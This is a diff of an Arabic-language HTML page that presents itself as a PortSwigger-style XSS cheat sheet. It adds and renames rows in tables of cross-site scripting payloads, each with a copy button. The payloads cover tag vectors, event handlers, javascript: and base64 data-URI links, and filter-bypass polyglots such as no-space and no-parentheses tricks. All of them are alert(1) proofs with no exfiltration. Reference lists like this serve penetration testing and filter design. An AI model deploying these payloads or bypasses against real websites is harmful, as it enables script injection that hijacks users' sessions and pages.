@@ -45,6 +45,7 @@
     .ctx-badge { font-weight: 800; padding: 6px 12px; border-radius: 6px; font-size: 0.8rem; display: inline-block; white-space: nowrap; text-align: center; font-family: 'Outfit', sans-serif; }
     .ctx-tag { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.4); }
     .ctx-event { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.4); }
+    .ctx-attr { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.4); }
     .ctx-poly { background: rgba(168, 85, 247, 0.15); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.4); }
 
     .btn-copy { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #e2e8f0; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; font-family: 'Cairo', sans-serif; font-weight: 700; transition: all 0.2s; float: right; display: flex; align-items: center; gap: 5px; }
@@ -57,35 +58,37 @@
     <header class="doc-header">
       <a href="cheatsheet-hub.html" style="color:var(--accent-cyan); text-decoration:none; font-weight:bold; display:inline-flex; align-items:center; gap:6px; margin-bottom:12px;"><i class="bx bx-right-arrow-alt" style="font-size:1.3rem;"></i> العودة لمركز المراجع</a>
       <h1 class="doc-title"><i class="bx bx-code-alt"></i> PortSwigger Official XSS Master Cheat Sheet</h1>
-      <p class="doc-subtitle">الدليل التفاعلي المطابق رسمياً لمعايير PortSwigger لجميع وسوم وأحداث وتجاوزات الـ Cross-Site Scripting.</p>
+      <p class="doc-subtitle">الدليل التفاعلي المتكامل المطابق رسمياً لمعايير PortSwigger لجميع وسوم وأحداث وتجاوزات الـ Cross-Site Scripting.</p>
     </header>
 
     <div class="controls-bar">
       <div class="search-box">
         <i class="bx bx-search"></i>
-        <input type="text" id="payload-search" class="search-input" placeholder="بحث سريع في الوسوم والأحداث (مثال: body, onerror, iframe, svg, details)..." onkeyup="filterPayloads()">
+        <input type="text" id="payload-search" class="search-input" placeholder="بحث سريع في الوسوم والأحداث (مثال: body, onerror, iframe, svg, details, javascript, eval)..." onkeyup="filterPayloads()">
       </div>
       <div class="filter-tabs">
         <button class="filter-btn active" onclick="filterContext('all', this)">الكل (All Vectors)</button>
         <button class="filter-btn" onclick="filterContext('tags', this)">HTML Tags</button>
         <button class="filter-btn" onclick="filterContext('events', this)">Event Handlers</button>
+        <button class="filter-btn" onclick="filterContext('attr', this)">Attribute & URI</button>
         <button class="filter-btn" onclick="filterContext('poly', this)">Polyglots & Bypasses</button>
       </div>
     </div>
 
     <!-- 1. HTML TAGS -->
     <div class="section-card payload-card">
-      <h2 class="section-title"><span>1. Standard HTML Vectors & Tags (وسوم الـ XSS الأساسية)</span> <i class="bx bx-code" style="color:#64748b;"></i></h2>
+      <h2 class="section-title"><span>A. HTML Elements & Tags (وسوم الـ XSS الأساسية والتفاعلية)</span> <i class="bx bx-code" style="color:#64748b;"></i></h2>
       <div class="cs-table-wrapper">
         <table class="cs-table">
-          <thead><tr><th style="width:140px;">Vector Category</th><th>Target Tag Vector</th><th>Safely Encoded Exploit Payload</th></tr></thead>
+          <thead><tr><th style="width:140px;">Category</th><th>Target Tag Vector</th><th>Safely Encoded Exploit Payload</th></tr></thead>
           <tbody>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Script Tag</td><td><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<script>alert(1)</script>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Image Tag Error</td><td><code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<img src=x onerror=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>SVG Load Event</td><td><code>&amp;lt;svg onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<svg onload=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>IFrame Srcdoc</td><td><code>&amp;lt;iframe srcdoc="&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;"&amp;gt;&amp;lt;/iframe&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Body Onload</td><td><code>&amp;lt;body onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<body onload=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Details Ontoggle</td><td><code>&amp;lt;details open ontoggle=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<details open ontoggle=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Script Tag Execution</td><td><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<script>alert(1)</script>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Image Tag Error Event</td><td><code>&amp;lt;img src=x onerror=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<img src=x onerror=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>SVG Load Event Vector</td><td><code>&amp;lt;svg onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<svg onload=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>IFrame Srcdoc Execution</td><td><code>&amp;lt;iframe srcdoc="&amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;"&amp;gt;&amp;lt;/iframe&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Body Onload Event</td><td><code>&amp;lt;body onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<body onload=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Details Ontoggle Event</td><td><code>&amp;lt;details open ontoggle=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<details open ontoggle=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="tags"><td><span class="ctx-badge ctx-tag">TAG</span></td><td>Audio/Video Error Event</td><td><code>&amp;lt;audio src=1 onerror=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<audio src=1 onerror=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
           </tbody>
         </table>
       </div>
@@ -93,28 +96,43 @@
 
     <!-- 2. EVENT HANDLERS -->
     <div class="section-card payload-card">
-      <h2 class="section-title"><span>2. Event Handlers Matrix (أحداث التفاعل مع المستخدم)</span> <i class="bx bx-pointer" style="color:#64748b;"></i></h2>
+      <h2 class="section-title"><span>B. Event Handlers Matrix (أحداث التفاعل والـ DOM)</span> <i class="bx bx-pointer" style="color:#64748b;"></i></h2>
       <div class="cs-table-wrapper">
         <table class="cs-table">
-          <thead><tr><th style="width:140px;">Vector Category</th><th>Event Handler Name</th><th>Safely Encoded Exploit Payload</th></tr></thead>
+          <thead><tr><th style="width:140px;">Category</th><th>Event Handler Name</th><th>Safely Encoded Exploit Payload</th></tr></thead>
           <tbody>
             <tr data-ctx="events"><td><span class="ctx-badge ctx-event">EVENT</span></td><td>onfocus / autofocus</td><td><code>&amp;lt;input autofocus onfocus=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<input autofocus onfocus=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
             <tr data-ctx="events"><td><span class="ctx-badge ctx-event">EVENT</span></td><td>onmouseover</td><td><code>&amp;lt;a href="#" onmouseover=alert(1)&amp;gt;Hover Me&amp;lt;/a&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<a href=\"#\" onmouseover=alert(1)>Hover Me</a>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
             <tr data-ctx="events"><td><span class="ctx-badge ctx-event">EVENT</span></td><td>oncontentvisibilityautostatechange</td><td><code>&amp;lt;div style="content-visibility:auto" oncontentvisibilityautostatechange=alert(1)&amp;gt;&amp;lt;/div&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<div style=\"content-visibility:auto\" oncontentvisibilityautostatechange=alert(1)></div>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="events"><td><span class="ctx-badge ctx-event">EVENT</span></td><td>oncopy / onpaste</td><td><code>&amp;lt;input value="Copy Me" oncopy=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<input value=\"Copy Me\" oncopy=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
           </tbody>
         </table>
       </div>
     </div>
 
-    <!-- 3. POLYGLOTS & BYPASSES -->
+    <!-- 3. ATTRIBUTE & URI PAYLOADS -->
     <div class="section-card payload-card">
-      <h2 class="section-title"><span>3. XSS Polyglots & WAF Bypasses (تجاوزات الفلاتر الوراثية)</span> <i class="bx bx-shield-x" style="color:#64748b;"></i></h2>
+      <h2 class="section-title"><span>C. Attribute & URI Pseudo-Protocols (الخصائص والروابط الإجرائية)</span> <i class="bx bx-link-external" style="color:#64748b;"></i></h2>
       <div class="cs-table-wrapper">
         <table class="cs-table">
-          <thead><tr><th style="width:140px;">Vector Category</th><th>Bypass Technique</th><th>Safely Encoded Exploit Payload</th></tr></thead>
+          <thead><tr><th style="width:140px;">Category</th><th>Protocol Vector</th><th>Safely Encoded Exploit Payload</th></tr></thead>
           <tbody>
-            <tr data-ctx="poly"><td><span class="ctx-badge ctx-poly">POLY</span></td><td>Case Insensitive / Mixed</td><td><code>&amp;lt;sCrIpT&amp;gt;alert(1)&amp;lt;/sCrIpT&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<sCrIpT>alert(1)</sCrIpT>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
-            <tr data-ctx="poly"><td><span class="ctx-badge ctx-poly">POLY</span></td><td>Null Byte Injection</td><td><code>&amp;lt;script%00&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<script%00>alert(1)</script>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="attr"><td><span class="ctx-badge ctx-attr">ATTR</span></td><td>Javascript Pseudo-protocol</td><td><code>&amp;lt;a href="javascript:alert(1)"&amp;gt;Click&amp;lt;/a&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<a href=\"javascript:alert(1)\">Click</a>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="attr"><td><span class="ctx-badge ctx-attr">ATTR</span></td><td>Data URI Base64 HTML</td><td><code>&amp;lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&amp;gt;&amp;lt;/iframe&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- 4. POLYGLOTS & BYPASSES -->
+    <div class="section-card payload-card">
+      <h2 class="section-title"><span>D. XSS Polyglots & WAF Bypasses (تجاوز الفلاتر بدون علامات تنصيص/مسافات)</span> <i class="bx bx-shield-x" style="color:#64748b;"></i></h2>
+      <div class="cs-table-wrapper">
+        <table class="cs-table">
+          <thead><tr><th style="width:140px;">Category</th><th>Bypass Technique</th><th>Safely Encoded Exploit Payload</th></tr></thead>
+          <tbody>
+            <tr data-ctx="poly"><td><span class="ctx-badge ctx-poly">POLY</span></td><td>Bypass Without Spaces</td><td><code>&amp;lt;svg/onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('<svg/onload=alert(1)>')"><i class="bx bx-copy"></i> Copy</button></td></tr>
+            <tr data-ctx="poly"><td><span class="ctx-badge ctx-poly">POLY</span></td><td>Bypass Without Parentheses</td><td><code>window.onerror=eval;throw"=alert(1)"</code> <button class="btn-copy" onclick="copyCode('window.onerror=eval;throw\"=alert(1)\"')"><i class="bx bx-copy"></i> Copy</button></td></tr>
             <tr data-ctx="poly"><td><span class="ctx-badge ctx-poly">POLY</span></td><td>Universal Polyglot Vector</td><td><code>jaVasCript:/*--&amp;gt;&amp;lt;svg/onload=alert(1)&amp;gt;</code> <button class="btn-copy" onclick="copyCode('jaVasCript:/*-->&lt;svg/onload=alert(1)&gt;')"><i class="bx bx-copy"></i> Copy</button></td></tr>
           </tbody>
         </table>
